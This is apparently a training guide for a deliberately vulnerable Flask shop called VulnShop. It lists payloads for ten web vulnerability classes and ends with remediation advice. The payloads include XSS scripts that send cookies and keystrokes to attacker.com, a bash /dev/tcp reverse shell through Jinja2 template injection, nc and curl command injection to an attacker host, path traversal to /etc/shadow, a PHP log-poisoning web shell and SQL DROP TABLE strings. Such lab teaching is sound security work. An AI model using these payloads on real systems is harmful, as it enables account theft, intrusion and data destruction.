# 🔍 VulnShop Penetration Testing Guide

This guide provides detailed information for security professionals and students on how to test and exploit the vulnerabilities in VulnShop.

## 🎯 Target Information

**Application**: VulnShop - Vulnerable E-Commerce Platform  
**URL**: http://localhost:5000  
**Technology Stack**: Python Flask, SQLite, HTML/CSS/JavaScript  
**Purpose**: Educational vulnerability lab for security testing

## 📝 Methodology

### Phase 1: Reconnaissance & Information Gathering

1. **Application Mapping**
   ```bash
   # Directory enumeration
   dirb http://localhost:5000
   
   # Technology detection
   whatweb http://localhost:5000
   
   # Port scanning
   nmap -sV localhost
   ```

2. **Manual exploration**
   - Browse all pages and functionality
   - Identify input fields, forms, and parameters
   - Note error messages and debug information
   - Check for hidden endpoints in source code

### Phase 2: Vulnerability Assessment

## 🔓 1. SQL Injection

**Endpoint**: `/login`  
**Parameter**: `username`, `password`  
**Type**: Error-based, Union-based, Boolean-based blind

### Manual Testing
```
Username: ' OR '1'='1' --
Password: anything

Username: ' UNION SELECT 1,2,3,4,5 --
Password: test

Username: admin'; DROP TABLE users; --
Password: test
```

### Automated Testing
```bash
# SQLMap testing
sqlmap -u "http://localhost:5000/login" --data "username=test&password=test" --dbs

# Custom script
python exploits/sqli_exploit.py
```

### Impact
- Authentication bypass
- Database enumeration
- Data extraction
- Potential database corruption

---

## 🔓 2. Cross-Site Scripting (XSS)

**Endpoint**: Product comments (`/add_comment`)  
**Parameter**: `comment`  
**Type**: Stored XSS

### Test Payloads
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<iframe src=javascript:alert('XSS')></iframe>
<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
```

### Advanced Payloads
```html
<!-- Keylogger -->
<script>
document.onkeypress = function(e) {
    fetch('http://attacker.com/keylog?key=' + String.fromCharCode(e.which));
}
</script>

<!-- Session stealing -->
<script>
fetch('http://attacker.com/steal', {
    method: 'POST',
    body: 'cookies=' + document.cookie + '&storage=' + JSON.stringify(localStorage)
});
</script>
```

### Testing Steps
1. Navigate to any product page
2. Login with any credentials
3. Add malicious comment
4. Observe XSS execution
5. Test different payloads for filter bypass

---

## 🔓 3. Insecure Direct Object References (IDOR)

**Endpoint**: `/receipt/<order_id>`  
**Parameter**: `order_id` (URL parameter)

### Manual Testing
```bash
# Test different order IDs
curl http://localhost:5000/receipt/1
curl http://localhost:5000/receipt/2
curl http://localhost:5000/receipt/3
...
curl http://localhost:5000/receipt/100
```

### Automated Testing
```bash
# Custom script
python exploits/idor_exploit.py

# Burp Suite Intruder
# Use numbers payload 1-1000 on receipt ID parameter
```

### Business Impact
- Customer data exposure
- Privacy violations
- Competitive intelligence
- Regulatory compliance issues

---

## 🔓 4. Cross-Site Request Forgery (CSRF)

**Endpoint**: `/change_password`  
**Parameters**: `new_password`, `confirm_password`

### Attack Vector
Create malicious HTML page:
```html
<form action="http://localhost:5000/change_password" method="post">
    <input type="hidden" name="new_password" value="hacked123">
    <input type="hidden" name="confirm_password" value="hacked123">
    <input type="submit" value="Click for free money!">
</form>
<script>document.forms[0].submit();</script>
```

### Testing Steps
1. Login to VulnShop
2. Open `exploits/csrf_demo.html` in another tab
3. Click the attack button
4. Verify password was changed

### Advanced CSRF
```html
<!-- JSON CSRF -->
<script>
fetch('http://localhost:5000/change_password', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'new_password=csrf_attack&confirm_password=csrf_attack'
});
</script>
```

---

## 🔓 5. Directory Traversal / Local File Inclusion

**Endpoints**: `/view_file`, `/download/<filename>`  
**Parameters**: `file`, `filename`

### Test Payloads
```
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
/etc/passwd
../../../etc/shadow
../../../proc/version
../../../proc/cpuinfo
../app.py
../../app.py
/var/log/apache2/access.log
/etc/apache2/apache2.conf
```

### Automated Testing
```bash
python exploits/directory_traversal_exploit.py

# Manual with curl
curl "http://localhost:5000/view_file?file=../../../etc/passwd"
curl "http://localhost:5000/download/../../../etc/passwd"
```

### Log Poisoning Attack
If log files are accessible:
1. Poison logs via User-Agent: `<?php system($_GET['cmd']); ?>`
2. Include log file: `/var/log/apache2/access.log`
3. Execute commands: `&cmd=whoami`

---

## 🔓 6. Server-Side Request Forgery (SSRF)

**Endpoint**: `/check_url`  
**Parameter**: `url`

### Test Payloads
```
http://127.0.0.1:5000
http://localhost:22
http://localhost:3306
http://169.254.169.254/latest/meta-data/
file:///etc/passwd
ftp://internal-server/
gopher://127.0.0.1:6379/
```

### Port Scanning via SSRF
```python
import requests

for port in range(1, 1000):
    url = f"http://127.0.0.1:{port}"
    response = requests.post('http://localhost:5000/check_url', data={'url': url})
    # Analyze response for open ports
```

### Cloud Metadata Access
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/
```

---

## 🔓 7. Server-Side Template Injection (SSTI)

**Endpoint**: `/render_template`  
**Parameters**: `template`, `name`

### Detection Payloads
```
{{ 7*7 }}
${7*7}
<%= 7*7 %>
#{7*7}
```

### Exploitation Payloads (Jinja2)
```python
# Basic command execution
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('whoami').read() }}

# Alternative payloads
{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()") }}

{{ lipsum.__globals__.os.popen('ls -la').read() }}

# File reading
{{ self.__init__.__globals__.__builtins__.__import__('builtins').open('/etc/passwd').read() }}
```

### Reverse Shell
```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/attacker_ip/4444 0>&1"').read() }}
```

---

## 🔓 8. Command Injection

**Endpoint**: `/ping`  
**Parameter**: `host`

### Test Payloads
```bash
127.0.0.1; whoami
127.0.0.1 && id
127.0.0.1 | cat /etc/passwd
127.0.0.1; cat /etc/passwd
`whoami`
$(whoami)
127.0.0.1; nc -e /bin/bash attacker_ip 4444
```

### Blind Command Injection
```bash
# Time-based detection
127.0.0.1; sleep 5

# Out-of-band detection
127.0.0.1; nslookup $(whoami).attacker.com
127.0.0.1; curl http://attacker.com/$(whoami)
```

---

## 🔓 9. Business Logic Vulnerabilities

### Coupon Abuse
**Endpoint**: `/purchase`  
**Issue**: No proper coupon usage tracking

### Testing Steps
1. Login and find valid coupon (SAVE10, WELCOME20, MEGA50)
2. Make multiple purchases with same coupon
3. Verify discount applied each time

### Race Conditions
```python
import threading
import requests

def purchase_with_coupon():
    # Simultaneous requests with same coupon
    data = {'product_id': '1', 'quantity': '1', 'coupon_code': 'MEGA50'}
    requests.post('http://localhost:5000/purchase', data=data)

# Launch multiple threads
for i in range(10):
    threading.Thread(target=purchase_with_coupon).start()
```

---

## 🔓 10. Broken Authentication & Authorization

### Issues Identified
1. **Admin panel** (`/admin`) - No authentication required
2. **Weak password hashing** - MD5 without salt
3. **No session management** - Basic Flask sessions
4. **No brute force protection**

### Testing
```bash
# Admin panel access
curl http://localhost:5000/admin

# Password hash cracking
hashcat -m 0 -a 3 hash.txt ?d?d?d?d?d?d?d?d
john --format=Raw-MD5 hash.txt
```

---

## 🔧 Tools & Scripts

### Automated Testing
```bash
# Run comprehensive test
python test_all_vulnerabilities.py

# Individual exploits
python exploits/sqli_exploit.py
python exploits/idor_exploit.py
python exploits/directory_traversal_exploit.py
python exploits/csrf_exploit.py html
```

### Recommended Tools
- **Burp Suite Professional** - Web application testing
- **OWASP ZAP** - Automated scanning
- **SQLMap** - SQL injection testing
- **Nikto** - Web server scanning
- **DirBuster** - Directory enumeration
- **Nmap** - Network scanning

---

## 📊 Risk Assessment

| Vulnerability | CVSS Score | Risk Level | Exploitability |
|---------------|------------|------------|----------------|
| SQL Injection | 9.8 (Critical) | Critical | Easy |
| SSTI | 9.8 (Critical) | Critical | Medium |
| Command Injection | 9.8 (Critical) | Critical | Easy |
| XSS | 7.2 (High) | High | Easy |
| IDOR | 7.5 (High) | High | Easy |
| CSRF | 6.8 (Medium) | Medium | Easy |
| Directory Traversal | 7.5 (High) | High | Easy |
| SSRF | 7.3 (High) | High | Medium |
| Business Logic | 5.3 (Medium) | Medium | Easy |
| Broken Auth | 8.2 (High) | High | Easy |

---

## 🎓 Learning Objectives

After completing this penetration test, you should understand:

1. **Manual testing techniques** for each vulnerability type
2. **Automated tool usage** and their limitations
3. **Impact assessment** and business risk evaluation
4. **Exploitation techniques** and payload development
5. **Report writing** and remediation recommendations

---

## 🛡️ Remediation Guide

### SQL Injection
- Use parameterized queries/prepared statements
- Implement input validation
- Apply principle of least privilege
- Enable SQL query logging

### XSS
- Implement output encoding/escaping
- Use Content Security Policy (CSP)
- Validate and sanitize input
- Use frameworks with built-in XSS protection

### IDOR
- Implement proper access controls
- Use indirect reference maps
- Validate user permissions for each request
- Log access attempts

### CSRF
- Implement CSRF tokens
- Verify referrer headers
- Use SameSite cookie attributes
- Require current password for sensitive operations

### Directory Traversal
- Implement input validation
- Use whitelisting for file access
- Run with minimal privileges
- Implement proper error handling

### SSRF
- Implement URL validation and whitelist
- Use network segmentation
- Disable unused protocols
- Monitor outbound connections

### SSTI
- Use safe template engines
- Avoid user-controlled template content
- Implement input sanitization
- Use sandboxing

### Command Injection
- Avoid system commands with user input
- Use safe alternatives (APIs instead of commands)
- Implement input validation
- Use parameterized APIs

### Business Logic
- Implement proper validation
- Use atomic operations
- Implement rate limiting
- Add business rule enforcement

### Authentication Issues
- Use strong password policies
- Implement proper session management
- Use secure authentication mechanisms
- Add brute force protection

---

## 📚 References

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [SANS Web Application Security](https://www.sans.org/cyber-security-courses/web-app-penetration-testing-ethical-hacking/)

---

**Remember**: This is for educational purposes only. Always obtain proper authorization before testing security vulnerabilities on any system.
